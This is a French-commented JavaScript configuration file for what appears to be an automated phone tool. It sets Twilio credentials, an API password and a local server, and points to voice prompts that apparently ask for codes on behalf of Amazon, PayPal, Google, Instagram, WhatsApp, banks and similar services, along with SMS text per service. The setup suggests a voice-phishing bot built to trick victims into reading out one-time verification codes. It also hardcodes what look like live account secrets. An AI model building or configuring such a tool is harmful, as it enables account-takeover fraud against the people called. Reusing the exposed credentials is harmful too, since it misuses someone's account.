module.exports = {
    setupdone: 'true',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'AC93dd209761bfd999f4440584a7f8df94',
    authToken: 'c1b5d3d3d18d0fde20c732b5402f59da',
    callerid: '+12057514764',

    /**
     * Informations à propos de l'API
     */
    apipassword: 'l6cyASEZc2ZRM2BxPUn0MuCjLtpXa5kZ',
    serverurl: 'http://192.168.1.6:1337/',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: '',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
